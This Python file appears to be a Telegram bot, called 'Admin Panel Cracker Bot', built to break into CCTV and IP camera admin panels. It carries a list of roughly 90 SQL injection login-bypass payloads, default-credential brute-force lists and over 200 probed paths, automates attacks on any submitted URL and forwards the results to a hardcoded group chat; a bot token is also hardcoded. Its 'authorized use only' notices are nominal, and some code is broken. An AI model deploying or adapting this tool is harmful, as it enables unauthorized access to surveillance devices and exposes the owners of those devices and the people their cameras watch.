import os
import json
import asyncio
import re
import logging
import threading
from typing import Tuple, Optional, Dict
from urllib.parse import urljoin
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from aiohttp import ClientSession, ClientTimeout, ClientError
from bs4 import BeautifulSoup
# from selenium import webdriver
# from selenium.webdriver.chrome.options import Options

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Environment variables
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "8020708306:AAHmrEb8nkmBMzEEx_m88Nenyz5QgrQ85hA")
ADMIN_ID = os.getenv("ADMIN_ID", "6972264549")
PORT = int(os.getenv("PORT", 8080))
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")

# Initialize users.json
if not os.path.exists("users.json"):
    try:
        with open("users.json", "w") as f:
            json.dump({"authorized_users": [ADMIN_ID]}, f)
    except Exception as e:
        logger.error(f"Failed to create users.json: {e}")

# Sensitive endpoints (200+)
DIRECT_PATHS = [
    "/dashboard", "/admin", "/login", "/live", "/config", "/settings", "/webcam", "/ipcam", "/stream", "/control",
    "/status", "/panel", "/home", "/index", "/main", "/setup", "/manage", "/system", "/user", "/profile",
    "/camera", "/video", "/snapshot", "/mjpeg", "/rtsp", "/playback", "/record", "/monitor", "/view", "/access",
    "/security", "/network", "/device", "/info", "/overview", "/logs", "/events", "/alerts", "/diagnostics", "/tools",
    "/admin/login", "/admin/dashboard", "/admin/config", "/admin/settings", "/admin/status", "/admin/control",
    "/login.php", "/admin.php", "/dashboard.php", "/config.php", "/settings.php", "/status.php", "/control.php",
    "/webcam/login", "/ipcam/login", "/camera/login", "/stream/login", "/live/login", "/video/login",
    "/admin/index", "/admin/main", "/admin/home", "/admin/panel", "/admin/setup", "/admin/manage",
    "/system/login", "/system/dashboard", "/system/config", "/system/settings", "/system/status",
    "/user/login", "/user/dashboard", "/user/settings", "/user/profile", "/user/control",
    "/manage/login", "/manage/dashboard", "/manage/config", "/manage/settings", "/manage/status",
    "/setup/login", "/setup/dashboard", "/setup/config", "/setup/settings", "/setup/status",
    "/control/login", "/control/dashboard", "/control/config", "/control/settings", "/control/status",
    "/panel/login", "/panel/dashboard", "/panel/config", "/panel/settings", "/panel/status",
    "/home/login", "/home/dashboard", "/home/config", "/home/settings", "/home/status",
    "/main/login", "/main/dashboard", "/main/config", "/main/settings", "/main/status",
    "/index/login", "/index/dashboard", "/index/config", "/index/settings", "/index/status",
    "/webcam/dashboard", "/ipcam/dashboard", "/camera/dashboard", "/stream/dashboard", "/live/dashboard",
    "/webcam/config", "/ipcam/config", "/camera/config", "/stream/config", "/live/config",
    "/webcam/settings", "/ipcam/settings", "/camera/settings", "/stream/settings", "/live/settings",
    "/webcam/status", "/ipcam/status", "/camera/status", "/stream/status", "/live/status",
    "/video/dashboard", "/video/config", "/video/settings", "/video/status",
    "/snapshot/dashboard", "/snapshot/config", "/snapshot/settings", "/snapshot/status",
    "/mjpeg/dashboard", "/mjpeg/config", "/mjpeg/settings", "/mjpeg/status",
    "/rtsp/dashboard", "/rtsp/config", "/rtsp/settings", "/rtsp/status",
    "/playback/dashboard", "/playback/config", "/playback/settings", "/playback/status",
    "/record/dashboard", "/record/config", "/record/settings", "/record/status",
    "/monitor/dashboard", "/monitor/config", "/monitor/settings", "/monitor/status",
    "/view/dashboard", "/view/config", "/view/settings", "/view/status",
    "/access/dashboard", "/access/config", "/access/settings", "/access/status",
    "/security/dashboard", "/security/config", "/security/settings", "/security/status",
    "/network/dashboard", "/network/config", "/network/settings", "/network/status",
    "/device/dashboard", "/device/config", "/device/settings", "/device/status",
    "/info/dashboard", "/info/config", "/info/settings", "/info/status",
    "/overview/dashboard", "/overview/config", "/overview/settings", "/overview/status",
    "/logs/dashboard", "/logs/config", "/logs/settings", "/logs/status",
    "/events/dashboard", "/events/config", "/events/settings", "/events/status",
    "/alerts/dashboard", "/alerts/config", "/alerts/settings", "/alerts/status",
    "/diagnostics/dashboard", "/diagnostics/config", "/diagnostics/settings", "/diagnostics/status",
    "/tools/dashboard", "/tools/config", "/tools/settings", "/tools/status",
    "/admin/system", "/admin/network", "/admin/security", "/admin/device", "/admin/logs",
    "/system/admin", "/system/network", "/system/security", "/system/device", "/system/logs",
    "/login/admin", "/login/dashboard", "/login/config", "/login/settings", "/login/status",
    "/cctv", "/cctv/login", "/cctv/dashboard", "/cctv/config", "/cctv/settings", "/cctv/status",
    "/ipcamera", "/ipcamera/login", "/ipcamera/dashboard", "/ipcamera/config", "/ipcamera/settings"
]

# Common login paths to check
LOGIN_PATHS = ["/login", "/admin", "/login.php", "/admin/login", "/web", "/auth", "/signin", "/default.html"]

# Credentials for brute force
USERNAMES = ["admin", "root", "user", "guest", "administrator"]
PASSWORDS = [
    "admin", "12345", "", "password", "123456", "admin123", "666666", "4321", "1111",
    "1234", "adminadmin", "root", "toor", "pass", "test", "qwerty", "letmein"
]

# SQL injection payloads (advanced, 90+)
SQL_PAYLOADS = [
    # Basic bypass
    "' OR '1'='1", "admin' --", "admin' #", "' OR ''='", "admin' OR '1'='1",
    "' OR 1=1--", "' OR 'a'='a", "') OR ('1'='1", "' OR 1=1#", "admin' OR 1=1--",
    "1' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "admin' OR 'a'='a",
    "' OR '1'='1'/*", "admin'/*", "admin'*/", "' OR 1=1/*", "admin' OR 1=1/*",
    "') OR '1'='1", "' OR '1'='1' OR ''='", "admin' OR ''='", "' OR 1=1 LIMIT 1--",
    "' OR 1=1 AND 1=1--", "admin' AND 1=2--", "' OR 1=1 ORDER BY 1--",
    "') OR ('1'='1')--", "' OR '1'='1' AND 'a'='a--", "admin' OR 1=1 LIMIT 1 OFFSET 0--",
    # Blind/time-based
    "' OR SLEEP(3)--", "' OR IF(1=1,SLEEP(3),0)--", "admin' AND SLEEP(3)--",
    "' OR (SELECT SLEEP(3))--", "' OR 1=1 AND (SELECT SLEEP(3) FROM dual)--",
    "' OR BENCHMARK(2000000,MD5(1))--", "admin' OR SLEEP(3) AND '1'='1--",
    "' OR 1=1 AND SLEEP(3) LIMIT 1--", "' OR IF((SELECT 1)=1,SLEEP(3),0)--",
    "' OR 1=1 AND IF(1=1,SLEEP(3),0)--", "' OR SLEEP(3) AND '1'='1'--",
    "' OR SLEEP(4)--", "' OR IF(1=1,SLEEP(4),0)--", "admin' AND SLEEP(4)--",
    # Union-based
    "' UNION SELECT NULL, NULL--", "' UNION SELECT 1, 2--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT 1, concat(username, ':', password) FROM users--",
    "' UNION SELECT 1, version()--", "' UNION SELECT 1, user()--",
    "' UNION SELECT 1, database()--", "' UNION SELECT 1, @@version--",
    "' UNION SELECT 1, table_name FROM information_schema.tables--",
    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
    "admin' UNION SELECT NULL, concat(username, ':', password) FROM users--",
    "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT 1, 2, 3--",
    # Error-based
    "' OR 1=1 AND (SELECT 1 FROM users WHERE 1=1)--",
    "admin' AND (SELECT password FROM users WHERE username='admin')--",
    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' OR 1=1 AND (SELECT 1/0 FROM dual)--",
    "' OR 1=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
    "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
    "' OR 1=1 AND FLOOR(RAND(0)*2)--",
    # Stacked queries
    "'; SELECT 1--", "'; SELECT SLEEP(3)--", "admin'; SELECT username FROM users--",
    "'; INSERT INTO users (username, password) VALUES ('test', 'test')--",
    # CCTV-specific
    "' OR 'admin'='admin'--", "admin' OR 'root'='root'--", "' OR 'guest'='guest'--",
    "' OR '1'='1' AND user='admin'--", "admin' OR user='admin'--",
    "' OR '1'='1' AND username='admin'--", "admin' OR username='admin'--",
    "' OR '1'='1' AND login='admin'--", "admin' OR login='admin'--",
    "admin' AND 1=1--", "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
    "' OR '1'='1' AND user_id='admin'--", "admin' OR user_id='admin'--"
]

# Custom headers to mimic browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Referer": "http://example.com"
}

async def check_access(user_id: str) -> bool:
    if user_id == ADMIN_ID:
        return True
    try:
        with open("users.json", "r") as f:
            data = json.load(f)
            return user_id in data["authorized_users"]
    except Exception as e:
        logger.error(f"Error checking access: {e}")
        return False

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("Only admin can use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /add <user_id>")
        return
    new_user = context.args[0]
    try:
        with open("users.json", "r+") as f:
            data = json.load(f)
            if new_user not in data["authorized_users"]:
                data["authorized_users"].append(new_user)
                f.seek(0)
                f.truncate()
                json.dump(data, f, indent=2)
                await update.message.reply_text(f"User {new_user} added.")
            else:
                await update.message.reply_text(f"User {new_user} already authorized.")
    except Exception as e:
        logger.error(f"Error adding user: {e}")
        await update.message.reply_text(f"Error: {str(e)}")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await update.message.reply_text("Only admin can use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /remove <user_id>")
        return
    remove_user = context.args[0]
    try:
        with open("users.json", "r+") as f:
            data = json.load(f)
            if remove_user in data["authorized_users"]:
                data["authorized_users"].remove(remove_user)
                f.seek(0)
                f.truncate()
                json.dump(data, f, indent=2)
                await update.message.reply_text(f"User {remove_user} removed.")
            else:
                await update.message.reply_text(f"User {remove_user} not found.")
    except Exception as e:
        logger.error(f"Error removing user: {e}")
        await update.message.reply_text(f"Error: {str(e)}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    keyboard = [
        [
            InlineKeyboardButton("🔐 SQL Injection", callback_data="sql_injection"),
            InlineKeyboardButton("🔑 Brute Force", callback_data="brute_force")
        ],
        [
            InlineKeyboardButton("🌐 Direct Check", callback_data="direct_check"),
            InlineKeyboardButton("ℹ️ Help", callback_data="help")
        ]
    ]
    await update.message.reply_text(
        "🌐 Admin Panel Cracker Bot\n"
        "⚠️ Use only on authorized systems!\n"
        "Choose an option:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    await update.message.reply_text(
        "📖 Help\n"
        "/start - Start the bot\n"
        "/bypass - SQL injection bypass\n"
        "/brute - Brute force credentials\n"
        "/direct - Check direct endpoints\n"
        "/add <user_id> - Add user (admin only)\n"
        "/remove <user_id> - Remove user (admin only)\n"
        "⚠️ Ethical use only!"
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    context.user_data.clear()
    if context.user_data.get("progress_message_id"):
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data["progress_message_id"])
        except:
            pass
    await update.message.reply_text("Operation cancelled.")

async def get_form_fields(url: str, session: ClientSession) -> Tuple[Optional[str], Optional[str], Dict, Optional[str], Optional[str]]:
    try:
        async with session.get(url, headers=HEADERS, ssl=False, timeout=10) as response:
            html = await response.text()
            soup = BeautifulSoup(html, "html.parser")
            
            # Extract company name
            company = "Unknown"
            title = soup.title.string if soup.title else ""
            meta = soup.find("meta", {"name": ["description", "author", "generator", "keywords"]})
            meta_content = meta.get("content", "") if meta else ""
            scripts = soup.find_all("script")
            script_content = " ".join(script.get_text() for script in scripts)
            for source in [title, meta_content, html, script_content]:
                for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV", "ZKTeco", "Reolink"]:
                    if brand.lower() in source.lower():
                        company = brand
                        break
                if company != "Unknown":
                    break
            
            # Find form (including iframes)
            form = soup.find("form")
            if not form:
                iframes = soup.find_all("iframe")
                for iframe in iframes:
                    iframe_url = urljoin(url, iframe.get("src", ""))
                    async with session.get(iframe_url, headers=HEADERS, ssl=False, timeout=10) as iframe_response:
                        iframe_html = await iframe_response.text()
                        iframe_soup = BeautifulSoup(iframe_html, "html.parser")
                        form = iframe_soup.find("form")
                        if form:
                            html = iframe_html
                            soup = iframe_soup
                            break
            
            if not form:
                logger.error(f"No form found at {url}")
                return None, None, {}, company, url
            
            # Extract inputs
            inputs = form.find_all("input")
            form_data = {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}
            username_field = next((name for name in form_data if name.lower() in [
                "username", "user", "login", "email", "name", "loginid", "userid", "user_id", "uname", "userName"
            ]), None)
            password_field = next((name for name in form_data if name.lower() in [
                "password", "pass", "pwd", "passwd", "passcode", "passWord"
            ]), None)
            
            return username_field, password_field, form_data, company, url
    except ClientError as e:
        logger.error(f"Network error accessing {url}: {e}")
        return None, None, {}, "Unknown", url
    except Exception as e:
        logger.error(f"Error parsing form at {url}: {e}")
        return None, None, {}, "Unknown", url

# Selenium fallback (uncomment for local testing or paid Koyeb)
# async def get_form_fields_selenium(url: str) -> Tuple[Optional[str], Optional[str], Dict, Optional[str], Optional[str]]:
#     try:
#         options = Options()
#         options.add_argument("--headless")
#         options.add_argument("--no-sandbox")
#         options.add_argument("--disable-dev-shm-usage")
#         driver = webdriver.Chrome(options=options)
#         driver.get(url)
#         await asyncio.sleep(3)  # Wait for JS to render
#         html = driver.page_source
#         driver.quit()
#         
#         soup = BeautifulSoup(html, "html.parser")
#         company = "Unknown"
#         title = soup.title.string if soup.title else ""
#         meta = soup.find("meta", {"name": ["description", "author", "generator", "keywords"]})
#         meta_content = meta.get("content", "") if meta else ""
#         scripts = soup.find_all("script")
#         script_content = " ".join(script.get_text() for script in scripts)
#         for source in [title, meta_content, html, script_content]:
#             for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV", "ZKTeco", "Reolink"]:
#                 if brand.lower() in source.lower():
#                     company = brand
#                     break
#             if company != "Unknown":
#                 break
#         
#         form = soup.find("form")
#         if not form:
#             logger.error(f"No form found at {url} (Selenium)")
#             return None, None, {}, company, url
#         
#         inputs = form.find_all("input")
#         form_data = {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}
#         username_field = next((name for name in form_data if name.lower() in [
#             "username", "user", "login", "email", "name", "loginid", "userid", "user_id", "uname", "userName"
#         ]), None)
#         password_field = next((name for name in form_data if name.lower() in [
#             "password", "pass", "pwd", "passwd", "passcode", "passWord"
#         ]), None)
#         
#         return username_field, password_field, form_data, company, url
#     except Exception as e:
#         logger.error(f"Selenium error at {url}: {e}")
#         return None, None, {}, "Unknown", url

async def check_success(response, html: str, session: ClientSession) -> bool:
    try:
        if response.status in [200, 302]:
            soup = BeautifulSoup(html, "html.parser")
            if not soup.find("form") or not re.search(r'login|sign in|invalid|error|unauthorized', html, re.IGNORECASE):
                return True
            if re.search(r'dashboard|welcome|control panel|admin|settings|manage|overview|main', html, re.IGNORECASE):
                return True
            if response.url.path in ["/dashboard", "/admin", "/home", "/panel", "/settings", "/manage", "/control", "/main"]:
                return True
            if any(cookie in response.cookies for cookie in ["session", "auth", "PHPSESSID", "JSESSIONID", "token"]):
                return True
            if response.content_type == "application/json":
                json_data = await response.json()
                if any(key in json_data for key in ["success", "authenticated", "status"]) and json_data.get(key, False):
                    return True
            if response.status == 302 and response.headers.get("Location"):
                async with session.get(response.headers["Location"], headers=HEADERS, ssl=False, timeout=10) as redirect_response:
                    redirect_html = await redirect_response.text()
                    if re.search(r'dashboard|admin|settings|manage|overview|main', redirect_html, re.IGNORECASE):
                        return True
    except Exception as e:
        logger.error(f"Error checking success: {e}")
    return False

async def sql_injection(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
    results = []
    
    # Try provided URL and common login paths
    urls_to_check = [url] + [urljoin(url, path) for path in LOGIN_PATHS]
    for check_url in urls_to_check:
        username_field, password_field, form_data, company, final_url = await get_form_fields(check_url, session)
        
        # Report detection status
        if not username_field or not password_field:
            detection_message = f"❌ No login form detected at {check_url}. Company: {company}"
            await update.message.reply_text(detection_message)
            if GROUP_CHAT_ID:
                await context.bot.send_message(GROUP_CHAT_ID, detection_message)
            continue
        
        detection_message = f"✅ Login panel detected at {check_url}. Company: {company}"
        await update.message.reply_text(detection_message)
        if GROUP_CHAT_ID:
            await context.bot.send_message(GROUP_CHAT_ID, detection_message)
        
        # Start SQL injection
        total_payloads = len(SQL_PAYLOADS)
        progress_message = await update.message.reply_text(
            f"🔄 Starting SQL Injection on {check_url}\nProgress: 0/{total_payloads} payloads",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
        )
        context.user_data["progress_message_id"] = progress_message.message_id

        for i, payload in enumerate(SQL_PAYLOADS, 1):
            try:
                # Try payload in both username and password fields
                for field in [username_field, password_field]:
                    data = form_data.copy()
                    data[field] = payload
                    if field != password_field:
                        data[password_field] = "test"
                    if field != username_field:
                        data[username_field] = "admin"
                    async with session.post(check_url, data=data, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                        html = await response.text()
                        if await check_success(response, html, session):
                            direct_url = response.url if response.url.path != "/login" else f"{check_url.replace('/login', '')}/dashboard"
                            results.append(f"✅ Bypassed! Payload: {payload} (Field: {field})\n[🌐 Visit {direct_url}]")
                            logger.info(f"SQL bypass success: {payload} at {check_url}")
                            return results
                        cred_match = re.search(r'username:.*?(\w+).*?password:.*?(\w+)', html, re.IGNORECASE)
                        if cred_match:
                            results.append(f"✅ Credentials Found: Username: {cred_match.group(1)}, Password: {cred_match.group(2)}")
                    await asyncio.sleep(0.6)
                if i % 5 == 0 or i == total_payloads:
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=progress_message.message_id,
                            text=f"🔄 SQL Injection on {check_url}\nProgress: {i}/{total_payloads} payloads",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")
            except ClientError as e:
                logger.error(f"Network error on payload {payload} at {check_url}: {e}")
                continue
            except Exception as e:
                logger.error(f"SQL injection error on payload {payload} at {check_url}: {e}")
                continue
        
        # Fallback to brute force
        if not results:
            await context.bot.edit_message_text(
                chat_id=update.effective_chat.id,
                message_id=progress_message.message_id,
                text=f"🔄 SQL Injection failed. Trying Brute Force on {check_url}\nProgress: 0/{len(USERNAMES) * len(PASSWORDS)} combinations",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
            )
            results = await brute_force(check_url, session, update, context, form_data, username_field, password_field)
            if results and "Cracked" in results[0]:
                return results
        
        # Clean up progress message
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_message.message_id)
        except:
            pass
        context.user_data.pop("progress_message_id", None)
        
        if results:
            return results
    
    return ["❌ No login form detected in provided URL or common login paths. Try a different URL or check HTML."]

async def brute_force(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE, form_data: Dict, username_field: str, password_field: str) -> list:
    results = []
    total_combinations = len(USERNAMES) * len(PASSWORDS)
    count = 0
    for username in USERNAMES:
        for password in PASSWORDS:
            count += 1
            try:
                data = form_data.copy()
                data[username_field] = username
                data[password_field] = password
                async with session.post(url, data=data, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                    html = await response.text()
                    if await check_success(response, html, session):
                        direct_url = f"{url.replace('/login', '')}/dashboard"
                        results.append(f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {direct_url}]")
                        logger.info(f"Brute force success: {username}:{password} at {url}")
                        return results
                    await asyncio.sleep(0.6)
                if count % 5 == 0 or count == total_combinations:
                    try:
                        await context.bot.edit_message_text(
                            chat_id=update.effective_chat.id,
                            message_id=context.user_data["progress_message_id"],
                            text=f"🔄 Brute Force on {url}\nProgress: {count}/{total_combinations} combinations",
                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
                        )
                    except Exception as e:
                        logger.error(f"Error updating progress: {e}")
            except ClientError as e:
                logger.error(f"Network error in brute force at {url}: {e}")
                continue
            except Exception as e:
                logger.error(f"Brute force error at {url}: {e}")
                continue
    return results or ["❌ No credentials found via brute force."]

async def direct_check(base_url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
    results = []
    total_paths = len(DIRECT_PATHS)
    progress_message = await update.message.reply_text(
        f"🔄 Starting Direct Check on {base_url}\nProgress: 0/{total_paths} paths",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_direct")]])
    )
    context.user_data["progress_message_id"] = progress_message.message_id

    for i, path in enumerate(DIRECT_PATHS, 1):
        try:
            full_url = urljoin(base_url, path)
            async with session.get(full_url, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                html = await response.text()
                if response.status == 200 and not re.search(r'<form.*?(login|username|password).*?>', html, re.IGNORECASE):
                    if re.search(r'dashboard|admin|control panel|settings|manage', html, re.IGNORECASE):
                        results.append(f"✅ Accessible without login: {full_url}\n[🌐 Visit {full_url}]")
                        logger.info(f"Direct access success: {full_url}")
                await asyncio.sleep(0.6)
            if i % 5 == 0 or i == total_paths:
                try:
                    await context.bot.edit_message_text(
                        chat_id=update.effective_chat.id,
                        message_id=progress_message.message_id,
                        text=f"🔄 Direct Check on {base_url}\nProgress: {i}/{total_paths} paths",
                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_direct")]])
                    )
                except Exception as e:
                    logger.error(f"Error updating progress: {e}")
        except ClientError as e:
            logger.error(f"Network error in direct check at {full_url}: {e}")
            continue
        except Exception as e:
            logger.error(f"Direct check error at {full_url}: {e}")
            continue
    
    try:
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_message.message_id)
    except:
        pass
    context.user_data.pop("progress_message_id", None)
    
    return results or ["❌ No open endpoints found."]

async def handle_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await query.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    context.user_data["mode"] = query.data
    await query.message.reply_text(f"Enter URL (e.g., http://192.168.1.1:80{'/login' if query.data != 'direct_check' else ''}):")

async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await update.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    mode = context.user_data.get("mode")
    if not mode:
        await update.message.reply_text("Please select an option first using /start.")
        return
    url = update.message.text.strip()
    if not url.startswith(("http://", "https://")):
        await update.message.reply_text("Invalid URL. Please include http:// or https://")
        return
    await update.message.reply_text(f"⚠️ Starting {mode.replace('_', ' ')} on {url}...\nUse only on authorized systems!")
    async with ClientSession(timeout=ClientTimeout(total=10)) as session:
        try:
            if mode == "sql_injection":
                results = await sql_injection(url, session, update, context)
            elif mode == "brute_force":
                username_field, password_field, form_data, company, final_url = await get_form_fields(url, session)
                if not username_field or not password_field:
                    results = [f"❌ No login form detected at {final_url}. Company: {company}"]
                else:
                    detection_message = f"✅ Login panel detected at {final_url}. Company: {company}"
                    await update.message.reply_text(detection_message)
                    if GROUP_CHAT_ID:
                        await context.bot.send_message(GROUP_CHAT_ID, detection_message)
                    results = await brute_force(final_url, session, update, context, form_data, username_field, password_field)
            else:  # direct_check
                results = await direct_check(url, session, update, context)
            result_text = "\n".join(results)
            await update.message.reply_text(f"📊 Results:\n{result_text}")
            if GROUP_CHAT_ID:
                await context.bot.send_message(GROUP_CHAT_ID, f"📊 {mode.replace('_', ' ')} Results for {url}:\n{result_text}")
        except Exception as e:
            logger.error(f"Error in {mode} at {url}: {e}")
            await update.message.reply_text(f"Error: {str(e)}")

async def handle_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(update.effective_user.id)
    if not await check_access(user_id):
        await query.message.reply_text("Contact Admin for access - @Imvasupareek")
        return
    context.user_data.clear()
    if context.user_data.get("progress_message_id"):
        try:
            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=context.user_data["progress_message_id"])
        except:
            pass
    await query.message.reply_text("Operation cancelled.")

async def health_check(_):
    logger.info("Health check called")
    return Response(text="OK")

def run_health_server():
    logger.info("Starting health check server")
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    web_app = WebApp()
    web_app.router.add_get("/health", health_check)
    try:
        run_app(web_app, port=PORT, loop=loop)
    except Exception as e:
        logger.error(f"Health server error: {e}")

def main():
    health_thread = threading.Thread(target=run_health_server, daemon=True)
    health_thread.start()
    logger.info("Health check server thread started")

    try:
        app = Application.builder().token(TELEGRAM_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("add", add_user))
        app.add_handler(CommandHandler("remove", remove_user))
        app.add_handler(CommandHandler("cancel", cancel))
        app.add_handler(CallbackQueryHandler(handle_option, pattern="^(sql_injection|brute_force|direct_check|help)$"))
        app.add_handler(CallbackQueryHandler(handle_cancel, pattern="^(cancel_sql|cancel_brute|cancel_direct)$"))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_url))
        logger.info("Starting Telegram bot")
        app.run_polling()
    except Exception as e:
        logger.error(f"Bot error: {e}")

if __name__ == "__main__":
    main()
